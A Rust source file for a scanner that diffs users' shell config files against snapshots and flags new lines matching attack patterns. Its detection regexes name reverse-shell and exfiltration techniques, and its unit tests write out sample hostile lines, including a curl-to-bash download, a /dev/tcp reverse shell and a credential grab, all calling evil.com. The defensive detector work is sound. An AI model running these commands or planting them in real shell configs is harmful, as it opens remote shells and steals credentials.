use crate::detectors::Detector;
use async_trait::async_trait;
use chrono::Utc;
use regex::Regex;
use shared::{ScannerError, Severity, ThreatResult, ThreatType};
use std::path::{Path, PathBuf};
use std::sync::OnceLock;
use tracing::{debug, warn};

// Shell config file paths to monitor
const SHELL_CONFIG_PATHS: &[&str] = &[
    ".zshrc",
    ".bashrc",
    ".bash_profile",
    ".profile",
    ".zprofile",
    ".config/fish/config.fish",
];

pub struct ShellConfigDetector;

impl ShellConfigDetector {
    /// Get the snapshot path for a shell config file
    fn snapshot_path(config_path: &Path) -> PathBuf {
        // Use the same base directory logic as config files
        let base_dir = match std::env::var("HOME") {
            Ok(home) if !home.trim().is_empty() => PathBuf::from(home).join(".supplyguard"),
            _ => PathBuf::from("/var/db/supplyguard"),
        };
        std::fs::create_dir_all(&base_dir).ok();
        base_dir.join(format!("snapshot_{}", 
            config_path.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("unknown")
                .replace(".", "_")
        ))
    }

    /// Load snapshot from disk
    fn load_snapshot(config_path: &Path) -> Option<String> {
        let snapshot_path = Self::snapshot_path(config_path);
        std::fs::read_to_string(&snapshot_path).ok()
    }

    /// Save snapshot to disk
    fn save_snapshot(config_path: &Path, content: &str) -> Result<(), ScannerError> {
        let snapshot_path = Self::snapshot_path(config_path);
        std::fs::write(&snapshot_path, content)
            .map_err(|e| ScannerError::IoError(format!("Failed to save snapshot: {}", e)))?;
        Ok(())
    }

    /// Get or create snapshot (load from disk or use current content)
    fn get_snapshot(config_path: &Path, current_content: &str) -> String {
        Self::load_snapshot(config_path).unwrap_or_else(|| {
            // First run - save current content as snapshot
            if let Err(e) = Self::save_snapshot(config_path, current_content) {
                warn!("Failed to save initial snapshot for {}: {}", config_path.display(), e);
            }
            current_content.to_string()
        })
    }

    /// Compute diff and extract newly added lines
    fn diff_and_extract_new_lines(old_content: &str, new_content: &str) -> Vec<(usize, String)> {
        let old_lines: Vec<&str> = old_content.lines().collect();
        let new_lines: Vec<&str> = new_content.lines().collect();
        let mut new_additions = Vec::new();

        // Simple line-by-line diff
        let mut old_idx = 0;
        let mut new_idx = 0;

        while new_idx < new_lines.len() {
            if old_idx < old_lines.len() && old_lines[old_idx] == new_lines[new_idx] {
                // Lines match, advance both
                old_idx += 1;
                new_idx += 1;
            } else {
                // New line added
                new_additions.push((new_idx + 1, new_lines[new_idx].to_string()));
                new_idx += 1;
            }
        }

        new_additions
    }

    /// Check if a path is a shell config file
    fn is_shell_config_file(path: &Path) -> bool {
        let path_str = path.to_string_lossy().to_string();
        let file_name = path.file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("");

        // Check if file name matches shell config names
        if SHELL_CONFIG_PATHS.iter().any(|&p| {
            let config_name = p.split('/').last().unwrap_or(p);
            file_name == config_name || file_name == p
        }) {
            return true;
        }

        // Check if full path matches (including home directory paths)
        if let Ok(home) = std::env::var("HOME") {
            for &config_name in SHELL_CONFIG_PATHS {
                let full_path = PathBuf::from(&home).join(config_name);
                if path == full_path || path_str.ends_with(config_name) {
                    return true;
                }
            }
        }

        // Also check if path contains shell config name
        for &config_name in SHELL_CONFIG_PATHS {
            if path_str.contains(config_name) && (path_str.ends_with(config_name) || path_str.contains(&format!("/{}", config_name))) {
                return true;
            }
        }

        false
    }

    /// Scan newly added lines for malicious patterns
    fn scan_new_lines(path: &Path, new_lines: &[(usize, String)]) -> Vec<ThreatResult> {
        // Compile regex patterns once (lazy initialization)
        static CURL_WGET_PIPE: OnceLock<Regex> = OnceLock::new();
        static BASE64_DECODE1: OnceLock<Regex> = OnceLock::new();
        static BASE64_DECODE2: OnceLock<Regex> = OnceLock::new();
        static PATH_PREPEND1: OnceLock<Regex> = OnceLock::new();
        static PATH_PREPEND2: OnceLock<Regex> = OnceLock::new();
        static ALIAS_PATTERN: OnceLock<Regex> = OnceLock::new();
        static BACKGROUND_PROC: OnceLock<Regex> = OnceLock::new();
        static REVERSE_SHELL1: OnceLock<Regex> = OnceLock::new();
        static REVERSE_SHELL2: OnceLock<Regex> = OnceLock::new();
        static ENV_EXFIL: OnceLock<Regex> = OnceLock::new();

        let curl_wget_pipe = CURL_WGET_PIPE.get_or_init(|| Regex::new(r"(curl|wget)\s+.*\s*\|\s*(sh|bash|zsh|fish)").unwrap());
        let base64_decode1 = BASE64_DECODE1.get_or_init(|| Regex::new(r"base64\s+-d.*\s*\|\s*(sh|bash|zsh|fish|python|perl)").unwrap());
        let base64_decode2 = BASE64_DECODE2.get_or_init(|| Regex::new(r#"echo\s+["'].*["']\s*\|\s*base64\s+-d.*\s*\|\s*(sh|bash)"#).unwrap());
        let path_prepend1 = PATH_PREPEND1.get_or_init(|| Regex::new(r#"export\s+PATH=["']?([^"']*[:/](tmp|var/tmp|\.\w+|/dev|/proc)[^"']*[:/]|.*[:/](tmp|var/tmp|\.\w+|/dev|/proc))"#).unwrap());
        let path_prepend2 = PATH_PREPEND2.get_or_init(|| Regex::new(r#"PATH=["']?([^"']*[:/](tmp|var/tmp|\.\w+|/dev|/proc)[^"']*[:/]|.*[:/](tmp|var/tmp|\.\w+|/dev|/proc))"#).unwrap());
        let alias_pattern = ALIAS_PATTERN.get_or_init(|| Regex::new(r#"alias\s+(\w+)=\s*["'](.*)["']"#).unwrap());
        let background_proc = BACKGROUND_PROC.get_or_init(|| Regex::new(r"(&\s*$|nohup|disown)").unwrap());
        let reverse_shell1 = REVERSE_SHELL1.get_or_init(|| Regex::new(r"(nc\s+-e|bash\s+-i|/dev/tcp/|/dev/udp/)").unwrap());
        let reverse_shell2 = REVERSE_SHELL2.get_or_init(|| Regex::new(r"exec\s+.*(bash|sh|zsh).*>&.*<&").unwrap());
        let env_exfil = ENV_EXFIL.get_or_init(|| Regex::new(r"export\s+(AWS_|AZURE_|GCP_|GITHUB_|GITLAB_|DOCKER_|KUBECONFIG|.*SECRET|.*KEY|.*TOKEN|.*PASSWORD|.*PASSWD).*=.*(curl|wget|http|https|ftp)").unwrap());

        let mut threats = Vec::new();

        for (line_num, line) in new_lines {
            let line_lower = line.to_lowercase();
            let trimmed = line.trim();

            // Pattern 1: curl/wget piped to sh or bash
            if curl_wget_pipe.is_match(&line_lower) {
                threats.push(ThreatResult {
                    file_path: path.to_path_buf(),
                    threat_type: ThreatType::MaliciousInstallScript,
                    severity: Severity::Critical,
                    line_number: Some(*line_num),
                    matched_pattern: trimmed.to_string(),
                    pattern_name: "CURL_WGET_PIPE_SHELL".to_string(),
                    context: format!("Line {}: Suspicious download and execute pattern", line_num),
                    remediation: "Review this line carefully. Downloads piped directly to shell are dangerous. Verify the source URL is trusted.".to_string(),
                    timestamp: Utc::now(),
                });
            }

            // Pattern 2: base64 decode and execute
            if base64_decode1.is_match(&line_lower) || base64_decode2.is_match(&line_lower) {
                threats.push(ThreatResult {
                    file_path: path.to_path_buf(),
                    threat_type: ThreatType::ObfuscatedCode,
                    severity: Severity::Critical,
                    line_number: Some(*line_num),
                    matched_pattern: trimmed.to_string(),
                    pattern_name: "BASE64_DECODE_EXECUTE".to_string(),
                    context: format!("Line {}: Base64 decode and execute pattern", line_num),
                    remediation: "Base64-encoded commands are often used to obfuscate malicious code. Decode and review before executing.".to_string(),
                    timestamp: Utc::now(),
                });
            }

            // Pattern 3: PATH prepending with suspicious directories
            if path_prepend1.is_match(&line_lower) || path_prepend2.is_match(&line_lower) {
                threats.push(ThreatResult {
                    file_path: path.to_path_buf(),
                    threat_type: ThreatType::CredentialTheft,
                    severity: Severity::High,
                    line_number: Some(*line_num),
                    matched_pattern: trimmed.to_string(),
                    pattern_name: "SUSPICIOUS_PATH_PREPEND".to_string(),
                    context: format!("Line {}: PATH manipulation with suspicious directory", line_num),
                    remediation: "Prepending /tmp, hidden directories, or system directories to PATH can allow command hijacking. Review this change carefully.".to_string(),
                    timestamp: Utc::now(),
                });
            }

            // Pattern 4: Alias shadowing of common commands
            let dangerous_aliases = ["git", "npm", "pip", "cargo", "ssh", "sudo", "docker", "kubectl"];
            if let Some(caps) = alias_pattern.captures(&line_lower) {
                if let Some(cmd) = caps.get(1) {
                    let cmd_name = cmd.as_str();
                    if dangerous_aliases.contains(&cmd_name) {
                        threats.push(ThreatResult {
                            file_path: path.to_path_buf(),
                            threat_type: ThreatType::CredentialTheft,
                            severity: Severity::High,
                            line_number: Some(*line_num),
                            matched_pattern: trimmed.to_string(),
                            pattern_name: "ALIAS_SHADOWING".to_string(),
                            context: format!("Line {}: Alias shadowing critical command '{}'", line_num, cmd_name),
                            remediation: format!("Alias for '{}' can intercept and modify command execution. Verify the alias definition is legitimate.", cmd_name).to_string(),
                            timestamp: Utc::now(),
                        });
                    }
                }
            }

            // Pattern 5: Background process spawning
            if background_proc.is_match(trimmed) && 
               (trimmed.contains("curl") || trimmed.contains("wget") || trimmed.contains("bash") || trimmed.contains("sh")) {
                threats.push(ThreatResult {
                    file_path: path.to_path_buf(),
                    threat_type: ThreatType::ReverseShell,
                    severity: Severity::High,
                    line_number: Some(*line_num),
                    matched_pattern: trimmed.to_string(),
                    pattern_name: "BACKGROUND_PROCESS_SPAWN".to_string(),
                    context: format!("Line {}: Suspicious background process spawning", line_num),
                    remediation: "Background processes in shell configs can hide malicious activity. Review this line carefully.".to_string(),
                    timestamp: Utc::now(),
                });
            }

            // Pattern 6: Reverse shell patterns
            if reverse_shell1.is_match(&line_lower) || reverse_shell2.is_match(&line_lower) {
                threats.push(ThreatResult {
                    file_path: path.to_path_buf(),
                    threat_type: ThreatType::ReverseShell,
                    severity: Severity::Critical,
                    line_number: Some(*line_num),
                    matched_pattern: trimmed.to_string(),
                    pattern_name: "REVERSE_SHELL".to_string(),
                    context: format!("Line {}: Reverse shell pattern detected", line_num),
                    remediation: "This appears to be a reverse shell attempt. This is highly dangerous and should be removed immediately.".to_string(),
                    timestamp: Utc::now(),
                });
            }

            // Pattern 7: Export sensitive env vars to remote endpoints
            if env_exfil.is_match(&line_lower) {
                threats.push(ThreatResult {
                    file_path: path.to_path_buf(),
                    threat_type: ThreatType::CredentialTheft,
                    severity: Severity::Critical,
                    line_number: Some(*line_num),
                    matched_pattern: trimmed.to_string(),
                    pattern_name: "ENV_VAR_EXFILTRATION".to_string(),
                    context: format!("Line {}: Sensitive environment variable exported to remote endpoint", line_num),
                    remediation: "Exporting credentials to remote endpoints is extremely dangerous. Remove this immediately and rotate all affected credentials.".to_string(),
                    timestamp: Utc::now(),
                });
            }
        }

        threats
    }
}

#[async_trait]
impl Detector for ShellConfigDetector {
    async fn detect(&self, path: &Path, content: &str) -> Result<Vec<ThreatResult>, ScannerError> {
        // Check if this is a shell config file
        if !Self::is_shell_config_file(path) {
            return Ok(vec![]);
        }

        debug!("ShellConfigDetector scanning: {}", path.display());

        // Get snapshot (last known-good state)
        let snapshot = Self::get_snapshot(path, content);

        // If content matches snapshot, no changes detected
        if content == snapshot {
            return Ok(vec![]);
        }

        // Compute diff and extract newly added lines
        let new_lines = Self::diff_and_extract_new_lines(&snapshot, content);

        if new_lines.is_empty() {
            // Content changed but no new lines (maybe deletions or modifications)
            // Still scan the entire content for safety
            let threats = Self::scan_new_lines(path, &content.lines().enumerate().map(|(i, l)| (i + 1, l.to_string())).collect::<Vec<_>>());
            if threats.is_empty() {
                // No threats found, update snapshot
                Self::save_snapshot(path, content)?;
            }
            return Ok(threats);
        }

        // Scan newly added lines for malicious patterns
        let threats = Self::scan_new_lines(path, &new_lines);

        // If no threats found, update snapshot (user can confirm later via whitelist)
        if threats.is_empty() {
            debug!("No threats found in new lines, updating snapshot for {}", path.display());
            Self::save_snapshot(path, content)?;
        } else {
            warn!("Threats detected in {} - snapshot NOT updated. User must review and whitelist if safe.", path.display());
        }

        Ok(threats)
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec![] // We match by path, not extension
    }

    fn priority(&self) -> u8 {
        1 // High priority for shell configs
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::path::PathBuf;

    fn setup_test() -> PathBuf {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        let test_file = PathBuf::from(&home).join(".zshrc_test_supplyguard");
        // Clean up any existing test file
        let _ = fs::remove_file(&test_file);
        test_file
    }

    #[tokio::test]
    async fn test_curl_wget_pipe_shell() {
        let test_file = setup_test();
        let detector = ShellConfigDetector;
        
        let malicious_content = "curl http://evil.com/script.sh | bash\n";
        let threats = detector.detect(&test_file, malicious_content).await.unwrap();
        
        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "CURL_WGET_PIPE_SHELL");
        assert_eq!(threats[0].severity, Severity::Critical);
        let _ = fs::remove_file(&test_file);
    }

    #[tokio::test]
    async fn test_base64_decode_execute() {
        let test_file = setup_test();
        let detector = ShellConfigDetector;
        
        let malicious_content = "echo 'd2hvYW1p' | base64 -d | sh\n";
        let threats = detector.detect(&test_file, malicious_content).await.unwrap();
        
        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "BASE64_DECODE_EXECUTE");
        let _ = fs::remove_file(&test_file);
    }

    #[tokio::test]
    async fn test_suspicious_path_prepend() {
        let test_file = setup_test();
        let detector = ShellConfigDetector;
        
        let malicious_content = "export PATH=\"/tmp:$PATH\"\n";
        let threats = detector.detect(&test_file, malicious_content).await.unwrap();
        
        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "SUSPICIOUS_PATH_PREPEND");
        let _ = fs::remove_file(&test_file);
    }

    #[tokio::test]
    async fn test_alias_shadowing() {
        let test_file = setup_test();
        let detector = ShellConfigDetector;
        
        let malicious_content = "alias git='curl http://evil.com | bash'\n";
        let threats = detector.detect(&test_file, malicious_content).await.unwrap();
        
        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "ALIAS_SHADOWING");
        let _ = fs::remove_file(&test_file);
    }

    #[tokio::test]
    async fn test_reverse_shell() {
        let test_file = setup_test();
        let detector = ShellConfigDetector;
        
        let malicious_content = "bash -i >& /dev/tcp/evil.com/4444 0>&1\n";
        let threats = detector.detect(&test_file, malicious_content).await.unwrap();
        
        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "REVERSE_SHELL");
        assert_eq!(threats[0].severity, Severity::Critical);
        let _ = fs::remove_file(&test_file);
    }

    #[tokio::test]
    async fn test_env_var_exfiltration() {
        let test_file = setup_test();
        let detector = ShellConfigDetector;
        
        let malicious_content = "export AWS_SECRET_KEY=$(curl http://evil.com/steal)\n";
        let threats = detector.detect(&test_file, malicious_content).await.unwrap();
        
        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "ENV_VAR_EXFILTRATION");
        let _ = fs::remove_file(&test_file);
    }

    #[test]
    fn test_diff_extraction() {
        let old = "line1\nline2\nline3\n";
        let new = "line1\nline2\nline3\nline4\nline5\n";
        let diff = ShellConfigDetector::diff_and_extract_new_lines(old, new);
        assert_eq!(diff.len(), 2);
        assert_eq!(diff[0].0, 4); // Line number
        assert_eq!(diff[0].1, "line4");
    }

    #[tokio::test]
    async fn test_safe_change_no_threats() {
        let test_file = setup_test();
        let detector = ShellConfigDetector;
        
        // First scan - creates snapshot
        let initial = "# My config\nexport EDITOR=vim\n";
        let _ = detector.detect(&test_file, initial).await.unwrap();
        
        // Second scan with safe addition
        let updated = "# My config\nexport EDITOR=vim\nexport PATH=\"$HOME/bin:$PATH\"\n";
        let threats = detector.detect(&test_file, updated).await.unwrap();
        
        // Should have no threats for safe PATH addition
        assert!(threats.is_empty());
        
        // Cleanup
        let _ = fs::remove_file(&test_file);
        let snapshot_path = ShellConfigDetector::snapshot_path(&test_file);
        let _ = fs::remove_file(&snapshot_path);
    }

    #[tokio::test]
    async fn test_background_process_spawn() {
        let test_file = setup_test();
        let detector = ShellConfigDetector;
        
        let malicious_content = "curl http://evil.com | bash &\n";
        let threats = detector.detect(&test_file, malicious_content).await.unwrap();
        
        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "BACKGROUND_PROCESS_SPAWN");
        let _ = fs::remove_file(&test_file);
    }

    #[test]
    fn test_is_shell_config_file() {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        
        assert!(ShellConfigDetector::is_shell_config_file(&PathBuf::from(&home).join(".zshrc")));
        assert!(ShellConfigDetector::is_shell_config_file(&PathBuf::from(&home).join(".bashrc")));
        assert!(ShellConfigDetector::is_shell_config_file(&PathBuf::from(&home).join(".bash_profile")));
        assert!(ShellConfigDetector::is_shell_config_file(&PathBuf::from(&home).join(".profile")));
        assert!(ShellConfigDetector::is_shell_config_file(&PathBuf::from(&home).join(".zprofile")));
        assert!(ShellConfigDetector::is_shell_config_file(&PathBuf::from(&home).join(".config/fish/config.fish")));
        
        assert!(!ShellConfigDetector::is_shell_config_file(&PathBuf::from("/tmp/random.sh")));
    }
}
